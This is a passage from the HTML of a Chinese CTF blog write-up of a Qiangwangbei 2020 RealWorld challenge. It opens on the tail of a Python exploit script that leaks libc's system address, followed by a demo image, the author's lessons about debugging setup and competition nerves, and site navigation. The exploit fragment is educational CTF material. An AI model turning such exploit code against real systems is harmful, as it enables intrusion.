class="number">0x4f4e0</span></span><br><span class="line">        <span class="keyword">print</span> <span class="string">"[+] system: %#x"</span> % self.system</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    p = Pwn()</span><br><span class="line">    p.setup()</span><br><span class="line">    p.leak_addrs()</span><br><span class="line">    p.exploit()</span><br></pre></td></tr></table></figure>
<h2 id="Demo"><a href="#Demo" class="headerlink" title="Demo"></a>Demo</h2><p><img src="https://i.loli.net/2020/09/22/CSl7E8DivryMmdA.png" alt="demo.png"><span class="image-caption">demo.png</span>)</p>
<h2 id="Lesson-Learned"><a href="#Lesson-Learned" class="headerlink" title="Lesson Learned"></a>Lesson Learned</h2><p>题目调试下来难度其实不算高，尤其是已经有前人exp的情况下，修改主要是集中在调试越界读时候的堆布局和通过库文件binary确定结构体的成员变量偏移。比赛当中没有解出来，列出几点思考：</p>
<ol>
<li>环境没有准备好，比赛就应该了解到Hyper-V和vmware的冲突以及解决方法，提前升级windows到2004版本，安装Vmware Workstation 16</li>
<li>考虑将主力虚拟机从hyper-v迁移到vmware，在RealWorld题目中会省去很多麻烦</li>
<li>运用gdb调试还不是很熟练，比如如何实现自动加载目标库基地址的功能，以及如何下断点更能提高调试效率</li>
<li>windows terminal ssh连接目标机器，配合tmux作为调试环境已经非常好用了</li>
<li>心理素质还是有点不够硬，这类题目如果在线上赛，身处熟悉的环境应该能按时解出的。现场气氛比较紧张，加上第一天上来就被windows pwn打蒙了，心态还是有点影响。</li>
</ol>
<p>大概是学生时期最后一次参加强网杯了， 感谢主办方设计的精彩题目，希望以后还有机会在现场解开RealWorld题目上台演示。</p>

      
    </div>

    <div>
      
        

      
    </div>

    <div>
      
        

      
    </div>


    <footer class="post-footer">
      

      
        <div class="post-nav">
          <div class="post-nav-next post-nav-item">
            
              <a href="/2020/09/04/QWB2020-Quals-mipsgame/" rel="next" title="[QWB2020 Quals] - mipsgame">
                <i class="fa fa-chevron-left"></i> [QWB2020 Quals] - mipsgame
              </a>
            
          </div>

          <span class="post-nav-divider"></span>

          <div class="post-nav-prev post-nav-item">
            
              <a href="/2020/10/27/ByteCTF2020-Quals-pwndroid/" rel="prev" title="[ByteCTF2020 Quals] - pwndroid">
                [ByteCTF2020 Quals] - pwndroid <i class="fa fa-chevron-right"></i>
              </a>
            
          </div>
        </div>
      

      
      
    </footer>
  </article>



    <div class="post-spread">
      
    </div>
  </div>

          
          </div>
          


          
  <div class="comments" id="comments">
    
  </div>


        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    <div class="sidebar-inner">

      

      
        <ul class="sidebar-nav motion-element">
          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
            文章目錄
          </li>
          <li class="sidebar-nav-overview" data-target="site-overview">
            本站概覽
          </li>
        </ul>
      

      <section class="site-overview sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
          <img class="site-author-image" itemprop="image" src="/images/avatar.gif" alt="Matthew Shao">
          <p class="site-author-name" itemprop="name">Matthew Shao</p>
          <p class="site-description motion-element" itemprop="description">坐中使气如秦侠 陌上行歌类楚狂</p>
        </div>
        <nav class="site-state motion-element">
        
          
            <div class="site-state-item site-state-posts">
              <a href="/archives">
                <span class="site-state-item-count">62</span>
                <span class="site-state-item-name">文章</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-categories">
              <a href="/categories">
                <span class="site-state-item-count">2</span>
                <span class="site-state-item-name">分類</span>
              </a>
            </div>
          

          
            <div class="site-state-item site-state-tags">
              <a href="/tags">
                <span class="site-state-item-count">14</span>
                <span class="site-state-item-name">標籤</span>
              </a>
            </div>
          

        </nav>

        

        <div class="links-of-author motion-element">
          
            
              <span class="links-of-author-item">
                <a href="https://github.com/MatthewShao" target="_blank" title="Github">
                  
                    <i class="fa fa-fw fa-globe"></i>
                  
                  Github
                </a>
              </span>
            
          
        </div>

        
        

        
        

        


      </section>

      
      <!--noindex-->
        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
          <div class="post-toc">

            
              
            

            
              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Vulnerabilities"><span class="nav-number">1.</span> <span class="nav-text">Vulnerabilities</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0xf2c10-patched"><span class="nav-number">1.1.</span> <span class="nav-text">0xf2c10 - patched</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xf2c10-origin"><span class="nav-number">1.2.</span> <span class="nav-text">0xf2c10 - origin</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xf1230-patched"><span class="nav-number">1.3.</span> <span class="nav-text">0xf1230 - patched</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0xf1230-origin"><span class="nav-number">1.4.</span> <span class="nav-text">0xf1230 - origin</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Debugging"><span class="nav-number">2.</span> <span class="nav-text">Debugging</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#poc"><span class="nav-number">3.</span> <span class="nav-text">poc</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#exp"><span class="nav-number">4.</span> <span class="nav-text">exp</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Demo"><span class="nav-number">5.</span> <span class="nav-text">Demo</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lesson-Learned"><span class="nav-number">6.</span> <span class="nav-text">Lesson Learned</span></a></li></ol></div>
            

          </div>
        </section>
      <!--/noindex-->
      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">
  
  &copy; 
  <span itemprop="copyrightYear">2021</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Matthew Shao</span>
</div>


<div class="powered-by">
  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 強力驅動
</div>

<div class="theme-info">
  主題 -
  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
    NexT.Logos
  </a>
</div>


        

        
      </div>
    </footer>

    <div class="back-to-top">
      <i class="fa fa-arrow-up"></i>
    </div>
  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  




  
  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>

  
  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>

  
  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>

  
  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>



  
  


  <script type="text/javascript" src="/js/src/schemes/logos.js?v=5.1.0"></script>



  
  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>



  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>



  



  




	





  





  

  




  
  

  

  

  

  


</body>
</html>
